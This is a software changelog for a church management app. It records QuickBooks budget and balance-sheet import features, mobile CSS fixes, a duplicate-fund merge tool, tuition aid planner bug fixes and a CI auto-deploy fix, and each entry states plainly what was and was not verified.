- New `finance_church_balances` table (migration `0019`, one row per account's own point-in-time balance, never a stored subtotal — same non-cumulative-row principle as `finance_church_entries`) plus `persistChurchBalancesImport()`, `computeBalanceSummary()`, and three endpoints: `finance/church/balances/import-preview`, `finance/church/balances/import`, `finance/church/balances` (read).
- UI shows Assets/Liabilities/Equity summary cards, a visible balance check (✓ balances, or ⚠ off by $X with a hint to check the import), and a collapsible full account tree — same preview-then-commit modal pattern as the Budget import.
- Per the user's explicit choice, this Balance Sheet data is its own new Church Report section only — the Overview tab's existing live-QuickBooks-synced account balances card is untouched, left for a later session.
- **Verification**: ran the parser directly against both real uploaded files — confirmed the real Statement of Financial Position balances exactly (Assets $1,189,619.36 = Liabilities $442,632.36 + Equity $746,987.00, `balancedCents: 0`) and the all-zero sandbox file parses cleanly too; 8 new unit tests cover both conventions (indent-metadata + leading-space fixtures, both hand-built with non-zero internally-consistent numbers since the real Statement file couldn't be used verbatim as a committed test fixture), the footer-skip fix, round-trip persistence, re-import replacement, and the "wrong report type uploaded to this importer" rejection. Also ran the actual served frontend's built `<script>` code (extract-and-`eval()`) with a stubbed DOM/fetch to confirm both the balanced and unbalanced-warning render paths and that the confirm-import flow posts the right filtered payload. `npm test` (79/79), `node --check`, built-`<script>`-block check. **Not verified**: an actual browser or a live upload through the real deployed Worker (same standing caveat as every browser/Workers-runtime-dependent feature in this app). (`src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/html-tabs.js`, `src/db.js`, `migrations/0019_finance_church_balances.sql`, `test/finance-church.test.js`)

### 2026-07-18 (v1.31.0 — Church Report: Budget import from a real QuickBooks "Budget vs. Actuals" Excel export)
The last deliberately-deferred FIN6 slice — CSV/Excel budget import — is done, using the user's real uploaded export (`TimothyEvangelicalLutheranChurch_BudgetvsActualsFY26.xlsx`, a live sandbox export) to validate the parser instead of a hand-built fixture. Two other uploaded files (`Statement_of_Financial_Position` / `BalanceSheetwithoutzeroaccts`) are balance-sheet reports (assets/liabilities/equity, a single "Total" column, no Actual/Budget split) — a structurally different report from what `finance_church_entries` models (income-statement classification × actual/budget), and account balances already sync live via the existing QuickBooks OAuth connection (Overview tab), confirmed working per FIN2. Not wired up; flagged rather than silently ignored, in case a manual balance-sheet import is wanted later as its own feature.
- **Server-side `.xlsx` reader** (`src/api-finance.js`) — ported from Tuition Aid's proven client-side ZIP+DEFLATE reader (`js-tuition-aid.js`, TAP10), adapted to run server-side in the Worker on the raw uploaded file (`DecompressionStream('deflate-raw')`/`DataView`/`TextDecoder` are all standard Web APIs available in both the Workers runtime and Node, confirmed by running it directly against the real file in this session) rather than duplicating the parse logic in the browser — the file uploads once, is parsed server-side, and only the resulting flat rows travel back to the browser for the preview step.
- **`parseBudgetVsActualsGrid()`** — the real export's hierarchy is encoded as literal leading spaces in column A (no cell-level indent metadata, confirmed against the real file), with "Total X" rows closing each group and never stored (always re-derivable from their children, same principle as the live sync's `flattenReportTree()`). A depth-0 row is only treated as a real classification opener when a genuinely nested row follows it — this report structure never has a bare top-level leaf account, so a lone depth-0 line with no children (the trailing "Friday, Jul 17, 2026 ... - Accrual Basis" timestamp footer, confirmed present in the real file) is correctly treated as noise and surfaced to the user rather than silently misread as a new account category.
- **Real bug this file's structure would have caused, caught before shipping**: the exported report's own top-level section labels are "Revenue"/"Expenditures", not QuickBooks' internal "Income"/"Expenses" — `normalizeChurchClassification()` maps the known synonyms back to the canonical names `computeYearSummary()` already expects; without this, every imported dollar would have silently vanished from the This Year/Multi-Year rollups (a wrong-but-plausible-looking bug, not a crash, so it could easily have shipped unnoticed).
- **`persistChurchEntriesImport()`** — wholesale-replaces `source='import'` rows for exactly the one fiscal year being imported (a Budget-vs-Actuals export is always single-year), leaving `qbo_sync` rows for other years untouched; existing per-year source-precedence resolution (`import` always wins over `qbo_sync`, from the original FIN6 slice) needed no changes.
- **Two new endpoints**: `POST /admin/api/finance/church/import-preview` (multipart upload, parses server-side, returns the flat rows + any skipped/unrecognized lines — no DB write) and `POST /admin/api/finance/church/import` (commits the previewed rows, optionally filtered by the user's checkboxes).
- **UI**: new "Import Budget" button on the Church Report card opens a modal (mirrors Tuition Aid's TAP10 import UX) — upload, review a checkbox-per-row preview (account name indented by depth, classification, actual, budget, plus a callout listing any skipped lines), then "Import Selected" commits only the checked rows and refreshes the report.
- **Verification**: ran the actual parser directly against the real uploaded file — correctly extracted fiscal year 2026, found the one "Budget vs. Actuals FY26" sheet, produced 102 account rows (matching every real leaf/group line in the file), correctly normalized "Revenue"/"Expenditures" to "Income"/"Expenses", correctly captured a group with its own posting AND children (the "40 Donor Income" account, the exact case that caused the FIN2/v1.26.1 double-counting bug — the real file's amounts were all $0 sandbox test data, so a separate hand-built fixture with non-zero, internally-consistent dollar amounts covers the actual rollup arithmetic in `test/finance-church.test.js`), and correctly identified the trailing date-stamp line as unrecognized noise rather than a bogus account. Also ran the served frontend's actual built `<script>` code (extract-and-`eval()`, this app's established technique) with a stubbed DOM/fetch to confirm `finChurchConfirmImport()` correctly filters to only the checked rows and POSTs the right JSON body to the right endpoint. `npm test` (72/72, 10 new import-specific cases), `node --check` on all touched files, built-`<script>`-block check. **Not verified**: an actual browser, and a live end-to-end upload through the real deployed Worker (Workers-runtime `DecompressionStream` support is a reasonable, standard-API bet but untested live — same standing caveat as every other browser/Workers-runtime-dependent feature in this app). (`src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/html-tabs.js`, `test/finance-church.test.js`)

### 2026-07-18 (v1.30.3 — Giving tab: removed the 4 stat tiles)
Removed the This Week / This Month / Year to Date / Givers YTD stat-tile row from the top of the Giving tab per request. Deleted `#giv-stats` markup, `loadGivingStats()`, and its call from `showTab()`. Backend `GET /admin/api/giving/stats` endpoint left in place (harmless, unused) — not part of the request. `npm test` (65/65), `node --check`, built-`<script>`-block check all pass. **Not verified**: an actual browser. (`src/frontend/html-tabs.js`, `src/frontend/js-giving.js`, `src/frontend/js-core.js`)

### 2026-07-18 (v1.30.2 — Mobile: Giving tab's Batches/Transactions/Reports toggle was invisible)
User reported (screenshot, mobile Safari) seeing only the stat tiles + Batches panel — no way to switch to Transactions or Reports. Root cause: the Giving tab's 3-way view toggle shares the `.view-toggle` CSS class with the People tab's List/Card/Household toggle, and a global `@media(max-width:767px){...,.view-toggle{display:none!important;}}` rule (from the People-tab mobile contact-list redesign) hides `.view-toggle` everywhere, not just on People — where it's correct (People switches to a dedicated mobile contact-list layout instead) but Giving has no such fallback, so its toggle just vanished with no other way to reach Transactions/Reports. Fixed by scoping the hide rule to `#tab-people .view-toggle` only. `npm test` (65/65), `node --check`, built-`<script>`-block check all pass. **Not verified**: an actual mobile browser. (`src/frontend/html-head.js`)

### 2026-07-18 (v1.30.0 — Finance nav: separate sidebar items again, Giving Reports moved into Giving)
- **Version bump note**: several real frontend changes shipped across the last few commits without a `DEPLOY_VERSION` bump (a miss against this repo's own convention) — this entry retroactively covers all of them under one version: the nav consolidation, its follow-up corrections below, the extracted chart helper, and the daycare-entries Edit button.
- **Nav consolidation, then corrected per direct user feedback**: first pass collapsed Giving/Tuition Aid/Finance into one sidebar entry with an internal sub-nav bar covering all seven sections — not what was wanted. Corrected to: three separate top-level sidebar items (Giving, Tuition Aid, Financial Reports — renamed from "Finance") under one section header renamed from "Giving" to "Finance". The Financial Reports tab keeps its own internal sub-nav for its own three sections (Overview/Church Report/Daycare Report).
- **Giving Reports relocated again, into the Giving tab**: the 8 giving-related report tiles (moved out of the Reports tab in an earlier session into a "Giving Reports" section under Financial Reports) moved once more, this time into the Giving tab itself as a third view alongside the existing Batches/Transactions toggle (`givSetView('reports')`). Financial Reports' sub-nav is back down to just its original three sections.
- **Charts**: `renderGroupedBarChart()` extracted from Attendance's `renderMultiYearServiceChart` (verified byte-for-byte identical output before anything else built on it) now backs a This-Year-vs-Last-Year-YTD chart and a Multi-Year Income/Expenses/Net trend chart in the Church Report.
- **Daycare entries Edit button**: Finance → Overview's daycare line-items table only ever had Add/Delete — added Edit (works for manual and synced rows alike; Delete stays manual-only).
- All verified against the actual built `<script>` blocks with Node harnesses at each step — no live browser was available for any of this work.

### 2026-07-18 (v1.30.1 — Mobile: Giving tab was unscrollable below the fold)
User reported on mobile Safari: could see the Giving tab's stat tiles and the Batches panel header/search/filter row, but couldn't scroll to anything below (the batch list itself, or the detail panel). Root cause: `.giving-layout` (the batch-list/batch-detail 2-column grid) is `flex:1;min-height:0;overflow:hidden` for the desktop layout, where both panels sit in one grid row and each panel's own internal `overflow-y:auto` scrolls within that shared, flex-constrained height. The existing `@media(max-width:900px)` rule collapsed the grid to one column, which makes the two panels stack into two separate grid rows — but the container was still `flex:1`/`overflow:hidden`, so it never grew past its flex-assigned height and the second stacked row (list content past the header, and the whole detail panel) was clipped with no way to reach it. Fixed by letting the mobile layout flow with the page instead of trying to constrain and internally scroll it: `.giving-layout` becomes `flex:none;overflow:visible` under the breakpoint, and `.batch-list-panel`/`.batch-detail-panel`/`#batch-list` all switch to `overflow:visible` too — the outer `.tab-panel.active` already provides the real page scroll. `npm test` (65/65), `node --check`, built-`<script>`-block check all pass. **Not verified**: an actual mobile browser (same standing gap as all prior CSS-only fixes this session) — the user's next mobile visit will be the real check. (`src/frontend/html-head.js`)

### 2026-07-18 — CI: fixed the real cause of "my change isn't showing up live" (deploy.yml was never firing)
- The nav consolidation reported as "not displaying correctly even in incognito" (see the entry directly below) turned out not to be a code or caching problem at all — a screenshot confirmed the exact old 3-item nav was still live, and checking `deploy.yml`'s actual run history against `main`'s commit log showed no deploy had fired since 19:38 that day, despite several real commits landing on `main` afterward via `auto-merge-claude.yml`.
- **Root cause**: GitHub does not fire other `on: push` workflows for a push made using the default `GITHUB_TOKEN` (an anti-recursion safeguard). `auto-merge-claude.yml`'s `git push origin HEAD:main` step is exactly that kind of push, so `deploy.yml`'s own `on: push: [main]` trigger silently never fired for any of it. Nothing was wrong with the nav consolidation, the charts, or the daycare Edit-button fix — they were all correct and merged, just never actually deployed to Cloudflare.
- **Fixed**: `auto-merge-claude.yml` now explicitly dispatches `deploy.yml` via `gh workflow run deploy.yml --ref main` as its final step (`workflow_dispatch` triggered via the API with `GITHUB_TOKEN` is allowed, unlike an implicit push-triggered run), plus the `actions: write` permission needed to call it. Manually triggered a catch-up deploy for the current `main` tip so everything already-merged actually goes live.
- **Lesson recorded in CLAUDE.md**: next time a "my change isn't showing up live" report comes in, check `deploy.yml`'s run history against `main`'s commit log first, before assuming it's a caching issue or a real bug in the shipped code.

### 2026-07-17 — Finance nav consolidation: shipped, then PAUSED per user direction (needs design)
- Shipped: shared `renderGroupedBarChart()` (extracted from Attendance, verified identical output) backing new This-Year-vs-Last-Year and Multi-Year Income/Expenses/Net charts; single "Finance" sidebar entry replacing the 3 separate Giving/Tuition Aid/Finance items, with a flat sub-nav bar shared across all three tab-panels; the 8 giving-related report tiles physically relocated from Reports into a new "Giving Reports" section under Finance. Also fixed a real bug reported separately: the daycare entries table (Finance → Overview) had no Edit button, only Add/Delete — added Edit (works for both manual and synced rows; Delete stays manual-only, unchanged).
- Also found and fixed a real CI infrastructure bug while getting all this live: `.github/workflows/auto-merge-claude.yml` (recreated earlier the same day after discovering it had never actually existed) was pinned to Node 20, but this repo's tests use `node:sqlite`, which needs Node 22+ — every push since it was recreated had been silently failing at the test step. Fixed (`node-version: 22`, `engines` added to `package.json`), confirmed working end-to-end.
- **Then paused**: user reports the nav consolidation isn't displaying correctly live, confirmed not a caching issue (checked in incognito). Root cause not yet diagnosed — no live browser was available to verify this change visually before shipping, which is exactly the gap that bit us here. **User's explicit direction**: stop iterating blind, leave as a backlog item (see CLAUDE.md's Finance Overview section), and loop in design before resuming — covering not just this bug but a broader look at how report tiles should be organized/moved. CSV/Excel import (the remaining deferred item) is independent of this and not blocked by it, but wasn't started this session.

### 2026-07-17 (v1.29.4 — BUG: Find Duplicate Funds group name showed lowercased)
- **Reported**: the duplicate-fund group header showed the name lowercased (e.g. "25004 building fund") instead of the real "25004 Building Fund" casing.
- **Root cause**: `GET /admin/api/funds/duplicates` groups funds by a normalized dedup key (`name.trim().toLowerCase()`), which is correct for matching — but the endpoint was also using that same lowercased key as the group's *display* name in the response instead of pulling the real-cased name off one of the actual fund rows.
- **Fix**: after sorting each group's funds by total (highest first, already done for radio-picker default), use the top fund's real `name` for the group header instead of the map key. `npm test` (65/65), `node --check`. Done 2026-07-17 (v1.29.4). (`src/api-households.js`)

### 2026-07-17 (v1.29.3 — BUG: Find Duplicate Funds 500 error — wrong column name)
- **Reported**: "Internal server error" clicking Find Duplicate Funds in Settings, immediately after G21 shipped (v1.29.0).
- **Root cause**: the new `GET /admin/api/funds/duplicates` query summed `giving_entries.amount_cents`, a column that doesn't exist — the real column storing integer-cents gift amounts is just `amount` (per this file's own Data Integrity checklist, which G21 didn't actually check against before shipping). The bad column name caused a SQL error on every call, surfaced to the browser as a generic Internal Server Error.
- **Fix**: query `SUM(amount)` instead of `SUM(amount_cents)`. The merge endpoint (`POST /admin/api/funds/merge`) was unaffected — it never referenced that column. `npm test` (65/65), `node --check`. Done 2026-07-17 (v1.29.3). (`src/api-households.js`)

### 2026-07-17 (CI — recreated .github/workflows/auto-merge-claude.yml, which had never actually existed)
- **Reported**: "the branches are not auto merging anymore, i have 4 waiting PRs that are now in conflict." Investigation found something more surprising than a regression: `auto-merge-claude.yml` does not exist anywhere in this repo's full git history (checked with `git log --all -- .github/workflows/auto-merge-claude.yml` after unshallowing the clone) — only `deploy.yml` has ever been committed. Every prior "auto-merge" this project's own changelog describes must have actually been a manual merge someone did by hand; the file itself was never real, despite being documented as live infrastructure.
- **Unblocked the immediate backlog**: of the (then) 3 open PRs, #590 had already been merged manually before this investigation started; #578 ("Office" role) turned out to be fully redundant — its entire diff was already present on `main` through some other path, confirmed by rebasing it onto `main` and watching the commit drop out as a pure no-op — closed without merging rather than risk reverting ~3,000 lines of everything that shipped since; #588 (this session's own Church Report v2 follow-up) had one real conflict (the usual `DEPLOY_VERSION`/changelog-insertion-point pair), rebased, resolved, retested, and merged.
- **Recreated the workflow** (`.github/workflows/auto-merge-claude.yml` + `.github/scripts/resolve-auto-merge-conflicts.js` + `.github/scripts/check-built-scripts.js`): triggers on any push to `claude/**`, merges into `main`, and — deliberately narrowly — auto-resolves ONLY the two conflict shapes that actually recur (the `DEPLOY_VERSION` line in `src/frontend/js-core.js`, and pure top-of-changelog insertions in `NOTES.md`/`CLAUDE.md`, both real, matching the recurring conflicts of this exact session and many before it). Any other conflicted file, or an unrecognized conflict shape in those three files, fails the job loudly instead of guessing — verified against synthetic repos for both the happy path (real conflict, auto-resolved, committed) and the refusal path (an unrelated file conflict correctly aborts with nothing pushed). Runs `npm test` and the established extract-and-`node --check` built-`<script>`-block verification before ever pushing to `main`, so a broken merge can't reach production even if the conflict resolution itself is fine.
- **Not verified**: an actual GitHub Actions run (this environment can create/edit workflow files but can't execute them) — the first real `claude/**` push after this merges is the real test.

### 2026-07-17 (v1.29.2 — Church Report v2: fund-broken-down giving, monthly sync + YoY-to-date + year-end projection)
- **Requested** right after v1.28.0 shipped: (1) break the single lump giving reference line into per-fund totals ("general fund, etc."), (2) a scan-and-refine list of graph/chart ideas (delivered as a text list, not built — design to refine later), (3) continue into the next staged phase of the Church Report v2 plan.
- **Per-fund giving reference** (`finance/church/this-year`): the giving reference query now `JOIN`s `funds` and groups by fund instead of a single `SUM(amount)`, returning `givingByFund: [{fundName, cents}, ...]` alongside the existing `givingCents` total (still the sum across funds). The This Year view renders this as a small per-fund table under the existing reference caption; the CSV export includes the same per-fund breakdown as indented rows.
- **Monthly sync, current + prior year only** (bounded, per the original plan, to avoid syncing a full 5-year monthly window): `finance/qb/sync` now makes one additional `profitAndLoss({summarize_column_by:'Month'})` call spanning `year-1`..`year`. New `parseMonthColTitle()` parses QBO's `"Mon YYYY"` monthly column headers; new `makeMonthlyExtractor()` feeds `flattenReportTree()` the same way `makeCurrentYearExtractor`/`makeMultiYearExtractor` already do, tagging each row with `period_month` (1-12) instead of the `0` used for annual rows — no collision with the annual rows in the `UNIQUE(fiscal_year, period_month, category_path, source)` constraint, so ordering relative to the annual flattens doesn't matter.
- **YoY-to-date + year-end projection**: new pure function `computeYtdComparison(currentMonthlyRows, priorMonthlyRows, priorAnnualRows, throughMonth)` — deliberately takes already-fetched rows (no DB access) so it's independently unit-tested, mirroring this project's own established pattern for `flattenReportTree` et al. Computes This-Year-YTD vs. Same-Period-Last-Year vs. Last-Year-Full for Income/Expenses/Net, then projects the full year via the prior-year-ratio method (`projected = YTD_this_year * (prior_year_full / prior_year_YTD_at_same_point)`), falling back to straight-line extrapolation only when the prior year's YTD-at-this-point was exactly zero (ratio undefined). Wired into `finance/church/this-year` — only computed when the requested year is the current calendar year (a past year's "as of today" comparison isn't meaningful); returns `{available:false}` cleanly when monthly data hasn't been synced yet (i.e. before this version's first sync), which the UI renders as an honest "not yet available, click Sync Now" note rather than a misleading number derived from annual-only data.
- **UI**: new "This year vs. last year (through &lt;Month&gt;)" table in the This Year view (Income/Expenses/Net rows × This-Year-YTD/Last-Year-YTD/Last-Year-Full/Projected-Full-Year columns) with the board-facing caption from the plan ("an estimate for planning, not a guarantee..."). Reuses the existing `MONTH_NAMES` global already defined in `js-attendance.js` (loaded earlier in the module concatenation order) rather than redefining it.
- **A repeat of a previously-documented bug class caught before shipping**: a code comment written for the new YoY block used a backtick around `` `yoy.available` `` — since `js-finance.js`'s entire content is itself wrapped in an outer `String.raw` template literal, that stray backtick silently truncated the whole file at build time (same failure mode as the SC3-BUG1/TAP2-BUG class documented earlier in this file). Caught immediately via the established "extract the built `&lt;script&gt;` blocks and `node --check` each" verification step, before ever running a test — fixed by removing the backtick from the comment text.
- Explicitly deferred to further follow-up (per the original plan): extracting a shared `renderGroupedBarChart()` helper and building actual SVG charts for the new YoY table (currently a plain table, no chart yet), Multi-Year view switched onto monthly-aware comparisons, CSV/Excel import, and the Finance/Giving/Tuition-Aid nav consolidation.
- `npm test` (including 8 new tests: `parseMonthColTitle`, the monthly `flattenReportTree` extractor, and `computeYtdComparison` covering both the prior-year-ratio and straight-line-fallback paths), `node --check` on all touched files and all 3 built `<script>` blocks. **Not verified**: an actual browser, or a live QuickBooks monthly sync (same standing caveat as the rest of this feature — FIN2's sandbox 5020 error still blocks a live end-to-end check).
- **Rebased past v1.29.0/v1.29.1** (Register delete-button/Record-Type field, Duplicate Fund Finder, Tuition Aid shared-pool/save-loss fixes — three sessions that landed on `main` while this was in progress): no real file overlap beyond `js-core.js`'s `DEPLOY_VERSION` line and this changelog's insertion point.

### 2026-07-17 (v1.29.0 — FEAT: Duplicate fund finder + merge tool)
- **Requested**: the Giving by Fund report showed multiple rows with the exact same name (e.g. two "40085 General Fund" rows, two "40085 Lent" rows) — confirmed with the user these are the same real-world fund, no longer in Breeze, and asked for a list to manually compare and merge rather than a blind auto-merge.
- **Root cause**: `funds.name` has no unique constraint, and `giving_entries.fund_id` is a real integer FK, so any two DB rows that happen to share a name render as two separate lines in reports that group by `fund_id` (`api-reports.js`'s `giving-summary` groups per row, not per name). An existing fund-mapping tool (`import/map-funds`) already does a similar reassign-then-delete merge, but is hard-scoped to Breeze placeholder funds (`breeze_id != ''`) merging into real funds only — it can't merge two arbitrary real funds that happen to share a name.
- **New backend** (`src/api-households.js`): admin-only `GET /admin/api/funds/duplicates` groups all funds by exact-match trimmed/lowercased name, returning any group with 2+ rows along with each row's `id`, `breeze_id`, `active` flag, gift count, and total cents (sorted highest-total first). `POST /admin/api/funds/merge` (`{keep_id, remove_ids}`) reassigns `giving_entries.fund_id` from each `remove_id` to `keep_id`, deletes the removed fund rows, and writes a `merge_funds` audit_log row (`field='merged_from'`, `old_value`=JSON list of removed ids, `new_value`=count of gifts moved).
- **New frontend** (Settings → Import/Export, next to the existing Breeze fund-mapping card): "Find Duplicate Funds" card lists each duplicate-name group in a table with a radio button per row (defaults to the highest-total row) and a per-group "Merge into selected" button with a confirm dialog before committing — manual review is required, nothing auto-merges.
- **Deliberately scoped to exact-name matching only** (no fuzzy/normalized matching beyond trim+lowercase) to keep the first pass low-risk and predictable; a name-similarity pass could be a follow-up if exact duplicates keep recurring under slightly different names.
- **Verified**: `npm test` (58/58), `node --check` on all touched files and all 3 built `<script>` blocks (technique per SC3-BUG1 — extract `<script>` bodies from the actual served `CHMS_HTML` and check them directly, not just the source fragments). **Not verified**: an actual browser, or a live merge against production data (no live D1 access in this environment). (`src/api-households.js`, `src/frontend/js-export-import.js`, `src/frontend/html-tabs.js`)
### 2026-07-17 (v1.29.0 — Register: delete button clarity + Record Type field)
- **Requested**: (1) user asked whether the small "×" icon at the end of a register row (next to Edit) deletes the record, and if so whether it could say "Delete" and confirm before doing so. It already asked for confirmation via a native browser `confirm()` dialog ("Delete this register entry? This cannot be undone.") — that part was already correct, just not obvious from a bare "×". Relabeled the button to say "Delete" (new `.reg-del-btn` class, sized to match the adjacent "Edit" button, distinct from the giving-tab's `.del-entry` "×" so that one is unaffected). (2) User separately noticed some baptism records show an "Infant" pill (the `record_type` badge, populated for records imported from the old paper register PDFs) and asked whether that's a field they can set — it wasn't exposed anywhere in the Add/Edit Entry form even though the backend (`church_register.record_type` column, `POST`/`PUT /admin/api/register`) already fully supported it. Added a "Record Type" text field to the register Add/Edit form (`reg-record-type`), wired through `saveRegisterEntry`, `openRegisterEdit`, and `clearRegForm`.
- **Verified**: `npm test` (58/58), `node --check` on all 3 built `<script>` blocks extracted from `CHMS_HTML`.

### 2026-07-17 (v1.29.1 — Tuition Aid Planner: shared-pool budget fix, real save-loss bug, pipeline grade override, grade sort)
- **Requested**: follow-up feedback right after v1.27.0 shipped — the combined Timothy Aid total wasn't behaving as one shared pool (LHS should draw first, K-8 gets the remainder), edits weren't reliably persisting ("if I uncheck LHS or enter a new aid amount, save that"), the pipeline "+ Add" form needed a grade field since birth year alone can't account for a kid near the cutoff date or a held-back kid, and the K-8/LHS planner tables needed to sort by grade.
- **Real bug #1 — 100x display/math error**: the new Total Timothy Aid budget input stored cents but was read back as if it were dollars in three places, so a $100,000 entry showed and computed as $10,000,000. Fixed all three read sites.
- **Design fix — one shared pool, not two independent budgets**: LHS awards ($1,200/kid, scales with enrollment) now draw from the total pool first; whatever's left becomes the actual K-8 budget (`tapK8BudgetFor(lhsTotal)`, falling back to the old standalone `k8_budget_cents` when no pool is configured). This now backs the K-8 gauge **and** Apply Aid Policy / Auto-Balance's actual math — previously those two bulk tools read the old fixed budget directly and weren't respecting the shared pool at all.
- **Real bug #2 — silent save loss**: `tapDebouncedSave`/`tapSavePinDebounced` replaced their pending timer (and its field payload) on every call instead of merging, so editing two different fields on the same student within the 500ms debounce window (e.g. unchecking "Plans to attend LHS" then adjusting outside aid) silently dropped the first field's save. The UI always looked correct during the session (each handler updates local state immediately, before debouncing), so this only surfaced as data missing after a reload — exactly matching the report. Fixed both functions to merge into a shared pending-fields map.
- **Pipeline grade override**: an optional grade field on the "+ Add to Pipeline" form now lets an explicit grade win over the birth-year-based projection (`tapGradeAt`), for the cases birth year alone gets wrong — a kid close to the school's cutoff date, or one being intentionally held back a year.
- **Grade sort fix**: the K-8/LHS tables' Grade column sort (from an earlier session) compared grade strings alphabetically, putting "K" after "8" and "10" before "9". Fixed to sort by the actual grade sequence, and made Grade the default sort for both tables.
- **Verified**: harness tests against the actual served code for all items — the $100k round-trip now displays/computes correctly, Apply Policy respects a shrunk derived budget, a rapid two-field edit produces one merged save with both fields present, a pipeline grade override wins over and progresses correctly from the birth-year formula, and both tables render in natural grade order by default. `npm test` (37/37), `node --check` on all touched files and all 3 built `<script>` blocks.
- **⚠ Not verified**: an actual browser (same standing caveat as every other Tuition Aid change this session).

### 2026-07-17 (v1.27.0 — Tuition Aid Planner: exact Timothy Award entry + combined K-8/LHS aid total)
- **Requested**: (1) type an exact dollar Timothy Award for a K-8 student, the same way Outside Aid already can be — previously it was only ever derivable from the Family Share % slider; (2) a combined field/gauge showing Timothy's total aid commitment across both the K-8 (WOL) budget and LHS awards. A third report ("the percentage looks backwards") turned out not to be a bug — confirmed with the user via a concrete example that the % represents the family's share of tuition *before* outside aid is subtracted, not their final out-of-pocket percentage, so a student with heavy outside aid can show a high % while owing very little. No code change needed there.
- **Exact Timothy Award entry**: new `timothy_award_override_cents`/`family_owed_override_cents` columns on `tuition_students` (migration `0017_tuition_timothy_override.sql`). Deliberately separate from the existing `timothy_award_exact_cents`/`family_owed_exact_cents` (the original Breeze/manual seed snapshot, read-only after the family % is first touched) — reusing those would have broken "Reset to Current Awards," which depends on them staying an untouched original baseline. The new override wins over the % slider's computed value whenever set, for the current year, regardless of touched state — the Timothy Award cell in the K-8 planner table is now a live input instead of a read-only number, with a "↺ auto" link to clear back to %-driven computation. Changing Outside Aid while an override is active keeps the typed Timothy Award fixed and only recomputes Family Owed; dragging the % slider clears the override (mutually exclusive, most-recent-control-wins). Reset to Current Awards, Apply Aid Policy, and Auto-Balance all explicitly clear the override too, so a previously-overridden student doesn't silently ignore a fresh bulk recompute forever. Also works for non-current years via the existing per-year pin mechanism, which already had this same "exact figure wins" priority from an earlier session (TAP5) — this really just extends that same concept to the current year, the one spot that didn't have it yet.
- **Found and fixed a pre-existing bug while in this code**: the Family Share % slider's DOM-sync logic queried `input[type=number]` across the whole table row and grabbed index `[0]`, assuming its own paired number box was the only one in the row — but Outside Aid's number input sits earlier in the row and was already silently claiming that slot, even before today's changes. Fixed by scoping the query to the slider's own container instead of the whole row.
- **Combined Timothy aid total**: new `timothy_total_budget_cents` config value (no schema change needed — config is already a generic key/value table) and a new gauge card showing K-8 Timothy Award total + LHS Award total against this one combined budget, sitting alongside — not replacing — the two existing individual gauges (per the user's explicit choice). Shows a neutral "set a budget" prompt instead of a misleading bar until a value is entered.
- **Verified**: an 11-case Node harness run against the actual served (`String.raw`-processed) code, covering the full priority chain (default computed → typed override → outside-aid-sync-while-overridden → slider-clears-override → Reset-clears-override → bulk-save-clears-override → explicit clear), the future-year pin path, and both gauge states with exact PATCH bodies asserted — all passed. `npm test` (37/37), `node --check` on all touched files and all 3 built `<script>` blocks, div-balance check on the new HTML.
- **⚠ Not verified**: an actual browser (same standing caveat as every other Tuition Aid change this session).

### 2026-07-17 (v1.28.0 — FEAT: Church Report v2 — persisted table, This Year/Multi-Year toggle, giving reference line)
- **Requested**: after using the year-by-year Church Report, the user wanted (1) a "how are we doing THIS year, and how much budget is left" view rather than only a flat multi-year Actual-only table, (2) less dependency on the live QuickBooks API (which has already broken once — the 5020 Permission Denied issue, FIN2) via a persisted, eventually CSV/Excel-importable table, since the real church's numbers will come from QuickBooks exports rather than the fake sandbox company currently connected, and (3) ChMS's own recorded giving shown as a cross-check reference line. Full design (including the double-counting-safe schema, the Excel-import hierarchy-detection algorithm for a later phase, and a planned Finance-nav consolidation) written up as a plan doc before implementation — this entry covers the first staged slice (persisted table + live sync + This Year/Multi-Year toggle, annual-only); YoY-to-date comparison, year-end projection, charts, CSV/Excel import, and the nav consolidation are deliberately deferred to follow-up work.
- **New table `finance_church_entries`** (migration `0018_finance_church_entries.sql`): stores one row per real account/category node's own, non-cumulative actual+budget amount (never QuickBooks' own "Total for X" subtotal rows) — roll-ups are always recomputed at read time via `category_path` prefix matching, which is what makes the double-counting bug just fixed in v1.26.1 structurally impossible to reintroduce here. Found and fixed a real bug in the schema itself before it ever shipped: `period_month` was originally nullable, but SQLite/D1 treat `NULL != NULL` for `UNIQUE`-constraint purposes, so every annual re-sync would have silently inserted a fresh duplicate row instead of upserting — caught by a real-SQL integration test (not a hand-rolled mock), fixed by using `0` (a real, poolable value) to mean "annual row" instead of `NULL`.
- **`flattenReportTree()`** (`src/api-finance.js`): walks the same merged QuickBooks report tree the v1.26.1 fix already produces (`mergeProfitAndLossTree`) and flattens it into rows ready for the new table — reusing the already-collision-safe merge logic rather than re-deriving it. `mergeCurrentYearBudgetAndActual()` extracted from `buildBudgetVsActualFallback` so persistence always uses our own trusted, known-shape merge pipeline for the current year regardless of whether QuickBooks' own BudgetVsActual report call succeeds — its column layout isn't guaranteed to match what persistence expects, so it's never flattened directly.
- **Live sync** (`finance/qb/sync`) now also populates `finance_church_entries`: the multi-year actuals-only flatten runs first, then the current-year budget-merge flatten second, so the richer current-year row's `ON CONFLICT DO UPDATE` overwrites whatever the multi-year pass just wrote for that year — verified with a real-SQL integration test exercising this exact ordering. Wholesale-replaces `source='qbo_sync'` rows scoped only to the years being resynced, leaving any future `source='import'`/`'manual'` rows untouched (verified). The now-fully-superseded `finance_qb_snapshot` blob cache key `profit_and_loss_by_year` (nothing reads it anymore once Church Report switched to the new table) was removed as dead weight, along with the matching dead fields in `finance/overview`'s response.
- **New endpoints** `GET finance/church/this-year?year=YYYY` and `GET finance/church/multi-year?years=Y1,Y2,...`: read-only against the persisted table (no live QuickBooks call), resolving per-year source precedence (an `import`/`manual` row for a year always wins over `qbo_sync` for that same year — the whole point of a future import is to override/backfill). `computeYearSummary()` derives Gross Profit/Net Operating Income/Net Other Income/Net Income the same way the live merge already does, now over persisted rows — verified against the exact real QuickBooks export figures used to build/verify the v1.26.1 fix.
